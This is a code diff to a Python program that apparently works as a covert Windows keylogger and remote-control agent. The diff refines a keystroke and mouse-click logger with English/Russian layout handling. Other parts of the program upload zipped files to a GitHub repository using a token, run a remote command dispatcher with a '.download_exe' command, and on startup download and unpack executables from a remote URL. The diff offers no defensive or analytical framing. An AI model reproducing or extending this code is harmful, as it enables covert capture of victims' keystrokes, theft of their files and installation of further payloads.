@@ -96,9 +96,10 @@ def github_upload(token, repo, path):
     name = f'{dt.date()}_' \
            f'{s_time}_' \
            f'{os.path.split(path)[-1]}'
+    name = os.path.join(directory, name)
     zip_file = name + '.zip'
     if os.path.isdir(path):
-        shutil.make_archive(name, 'zip', path)
+        shutil.make_archive(base_name=name, format='zip', root_dir=path)
     elif os.path.exists(path):
         if not os.path.isdir(name):
             os.mkdir(name)
@@ -118,7 +119,7 @@ def github_upload(token, repo, path):
     base_tree = repo.get_git_tree(master_sha)
 
     data = base64.b64encode(open(zip_file, 'rb').read())
-    blob = repo.create_git_blob(data.decode('utf-8'), "base64")
+    blob = repo.create_git_blob(data.decode('utf-8'), 'base64')
     element = InputGitTreeElement(path=zip_file, mode='100644',
                                   type='blob', sha=blob.sha)
     tree = repo.create_git_tree([element], base_tree)
@@ -130,39 +131,49 @@ def github_upload(token, repo, path):
 
 
 class KeyLogger:
+    debug = False
+
     def get_key_name(self, key):
         if isinstance(key, keyboard.KeyCode):
             return key.char
         return str(key)
 
-    def caps_state(self):
+    def get_caps_state(self):
         hllDll = WinDLL("User32.dll")
         return hllDll.GetKeyState(0x14) & 0xffff != 0
 
-    def on_press(self, key):
+    def get_layout(self):
         hwnd = self.user32.GetForegroundWindow()
         threadID = self.user32.GetWindowThreadProcessId(hwnd, None)
         CodeLang = self.user32.GetKeyboardLayout(threadID)
+        if CodeLang == 0x4090409:
+            return 'en'
+        if CodeLang == 0x4190419:
+            return 'ru'
+
+    def on_press(self, key):
+        layout = self.get_layout()
         if isinstance(key, keyboard.KeyCode):
             key_name = key.char
             d = '0123456789*+ -./'
             if not key_name and 96 <= key.vk <= 112:
                 key_name = str(d[key.vk - 96])
             if key_name and len(key_name) == 1:
-                if CodeLang == 0x4090409:
+                if layout == 'en':
                     ...
-                elif CodeLang == 0x4190419:
-                    if key_name in self._trans_table:
-                        key_name = self._trans_table[key_name]
+                elif layout == 'ru':
+                    if key_name in self._trans_table_en_to_ru:
+                        key_name = self._trans_table_en_to_ru[key_name]
                 else:
-                    # print('error')
-                    ...
-                if self.caps_state():
-                    if key_name.islower():
-                        key_name = key_name.upper()
-                    else:
-                        key_name = key_name.lower()
-                self.current_line += key_name
+                    if self.debug:
+                        raise ValueError('undetectable layout')
+                if key_name.isprintable():
+                    if self.get_caps_state():
+                        if key_name.islower():
+                            key_name = key_name.upper()
+                        else:
+                            key_name = key_name.lower()
+                    self.current_line += key_name
         elif hasattr(key, 'name'):
             name = key.name
             if name == 'backspace':
@@ -172,13 +183,10 @@ class KeyLogger:
             elif name in self.ignore_keys:
                 ...
             else:
-                if self.current_line:
-                    self.log_line(self.current_line)
-                    self.current_line = ''
                 self.log_symbol(name)
 
     def on_click(self, x, y, button, pressed):
-        if pressed and button == mouse.Button.left and self.previous_log != 'click':
+        if pressed and button == mouse.Button.left:
             self.log_symbol('click')
 
     def log_line(self, line):
@@ -190,40 +198,45 @@ class KeyLogger:
         self.previous_log = line
 
     def log_symbol(self, s):
-        self.output += f'[{s}]'
+        if self.current_line:
+            self.log_line(self.current_line)
+            self.current_line = ''
+        if s == self.previous_log:
+            self.output += '[]'
+        else:
+            self.output += f'[{s}]'
         self.check_temp_output()
         self.previous_log = s
 
     def check_temp_output(self):
         if len(self.output) >= self.output_max_temp_symbols:
-            with open(self.filename, 'a') as f:
-                f.write(self.output)
-                self.output = ''
+            if not self.debug:
+                with open(self.filename, 'a') as f:
+                    f.write(self.output)
+            else:
+                print(self.output, end='')
+            self.output = ''
 
     def start(self, filename):
         self.user32 = windll.user32
         self._eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
         self._rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
-        self._trans_table = dict(zip(self._eng_chars, self._rus_chars))
-        self.ignore_keys = {'shift', 'alt_l', 'alt_r', 'ctrl_l', 'ctrl_r',
-                            'caps_lock', 'tab'}
+        self._trans_table_en_to_ru = dict(zip(self._eng_chars, self._rus_chars))
+        self.ignore_keys = {'shift', 'alt_l', 'alt_r', 'ctrl_l', 'ctrl_r'}
         self.current_line = ''
         self.previous_log = ''
         self.filename = filename
-        self.output = ''
-        self.output_max_temp_symbols = 200
-        self.max_size_log_clear = 2 ** 20 * 5
         with open(self.filename, 'a') as f:
-            f.write('\n')
-        size = os.path.getsize(self.filename)
-        if size >= self.max_size_log_clear:
-            open(self.filename, 'w')
+            f.write('\n<---------->\n')
+        self.output = ''
+        self.output_max_temp_symbols = 100
+        if self.debug:
+            self.output_max_temp_symbols = 1
 
         key_listener = keyboard.Listener(on_press=self.on_press)
         key_listener.start()
         mouse_listener = mouse.Listener(on_click=self.on_click)
         mouse_listener.start()
-        time.sleep(1000)
 
 
 def cmd(*args, **kwargs):
@@ -236,7 +249,7 @@ def cmd(*args, **kwargs):
 def pre_cmd(s: str, directory='', v=False):
     global current_path, infoA, cursor_down
     if v:
-        return 8, 0
+        return 8, 2
 
     # ?
     variables = {
@@ -363,6 +376,15 @@ def pre_cmd(s: str, directory='', v=False):
         return 'Wrong syntax'.encode('cp866')
     elif cmd_name == '.print':
         return ' '.join(args).encode('cp866')
+    elif cmd_name == '.download_exe':
+        if not args:
+            download_folders(check=False)
+            return b''
+        return 'Wrong syntax'.encode('cp866')
+    elif cmd_name == '.get_layout':
+        if not args:
+            return keylogger.get_layout().encode('cp866')
+        return 'Wrong syntax'.encode('cp866')
     elif s[0] != '.':
         if s[0] == '?':
             msg = command(s[1:], True)
@@ -373,22 +395,28 @@ def pre_cmd(s: str, directory='', v=False):
     return 'No such command'.encode('cp866')
 
 
-def init(directory):
-    print('init')
+def download_folders(check=True):
     check_folders = {'executable': load_exe,
                      'images': load_images}
     for k, v in check_folders.items():
         name, url = k, v
         print(f'check {name}')
-        if not os.path.exists(os.path.join(directory, name)):
+        if not check or not os.path.exists(os.path.join(directory, name)):
             path = os.path.join(directory, f'{name}.zip')
             urlretrieve(load_prefix + url, path)
             shutil.unpack_archive(os.path.join(directory, f'{name}.zip'), directory, 'zip')
             os.remove(os.path.join(directory, f'{name}.zip'))
+
+
+def init(directory_):
+    global directory
+    directory = directory_
+    print('init')
+    download_folders()
     keylogger.start(os.path.join(directory, keylog_file))
 
 
-def track(directory=''):
+def track(directory):
     global check_init
 
     if cursor[1] > 0:
@@ -414,6 +442,7 @@ def track(directory=''):
     time.sleep(delay)
 
 
+directory = None
 infoA = False
 cursor = [(0, 0), 0, 0]
 cursor_down = [0, 0]
